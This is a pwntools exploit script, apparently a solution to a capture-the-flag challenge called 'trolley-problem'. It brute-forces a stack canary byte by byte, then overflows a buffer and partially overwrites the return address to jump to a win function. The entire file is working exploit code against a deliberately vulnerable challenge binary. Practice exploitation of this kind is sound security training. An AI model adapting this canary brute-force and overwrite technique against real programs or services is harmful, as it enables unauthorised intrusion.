from pwn import *
elf = context.binary = ELF("./chall")
io = process("./chall")
#io = remote("trolley-problem.harkonnen.b01lersc.tf",8443,sni=True,ssl=True)


def brute_force_canary():
    # Generate problems
    problems = 256*8 // 5
    for i in range(problems):
        io.sendline(b"I want problems!")
        io.recvuntil(b"you do?")
        print(f"Generating problems [{i+1}/{problems}]")
    io.recvuntil(b"you do?")
    # Find canary
    canary = b"\x00"
    known_bytes = 1
    while known_bytes < 8:
        for byte in range(256):
            if byte == 0xa:
                continue
            payload = flat(b"A"*24,canary,bytes([byte]))
            io.sendline(payload)
            for i in range(3):
                io.recvline()
            lines = io.recvuntil(b"you do?")
            if b'Uh oh' in lines:
                print(f"Updating canary: {canary}")
                canary += bytes([byte])
                break
        known_bytes+=1
    return canary

def checkCanary(io,canary) -> bool:
    print("Checking canary")
    io.sendline(flat(b"A"*24,canary))
    for i in range(3):
     io.recvline()
    lines = io.recvuntil(b"you do?")
    if b'Uh oh' in lines:
        print("Canary found")
        return True
    print("Wrong canary, maybe a false positive?")
    return False


# Paso 1: Fuerza bruta del canary
canary = brute_force_canary()
assert checkCanary(io,canary)
# Paso 2: Sobreescritura parcial
payload = flat(
            b"A"*24,
            canary,
            b"A"*8,
            p8(elf.sym.win & 0xFF)
        )
io.sendline(payload)
io.interactive()
